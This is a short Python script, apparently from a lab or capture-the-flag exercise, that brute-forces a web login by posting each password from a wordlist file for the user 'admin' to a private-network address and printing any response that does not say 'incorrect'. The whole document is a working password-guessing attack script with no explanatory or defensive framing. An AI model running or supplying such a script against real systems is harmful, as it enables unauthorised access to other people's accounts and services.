import requests
passwords = open('pw', 'r').readlines()
for pw in passwords:
    postdata = {'username': 'admin', 'password': pw.strip()}
    x = requests.post('http://10.10.174.197', postdata)
    if not b'incorrect' in x.content:
        print(x.content, pw)
